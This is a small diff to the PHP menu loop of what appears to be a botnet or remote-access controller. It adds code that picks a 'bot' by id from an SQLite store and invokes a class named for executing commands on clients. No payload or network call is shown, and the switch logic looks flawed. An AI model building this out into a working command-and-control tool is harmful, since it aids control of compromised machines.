@@ -62,12 +62,18 @@ while (true){
     switch ($c){
         case str_starts_with($c, "sys") !== false:
             $m->enumSystemMenu();
+            $a = new curlStuff\defaultClient\genericClientExecuteCommands();
             break;
         case str_starts_with($c, "rev") !== false:
             $m->reverseConnectionsMenu();
             break;
         case str_starts_with($c, "com") !== false:
             $m->commandMenu();
+            $database->slopSqlite(['action' => "fetch"]);
+            $id = readline("\033[0;34mPlease select a bot id to use:\033[0m ->");
+            $database->slopSqlite(['action' => "grabBot", "id" => $id]);
+            var_dump($database);
+            readline("press enter.");
             break;
         case str_starts_with($c, "a") !== false:
             $m->addHostMenu();
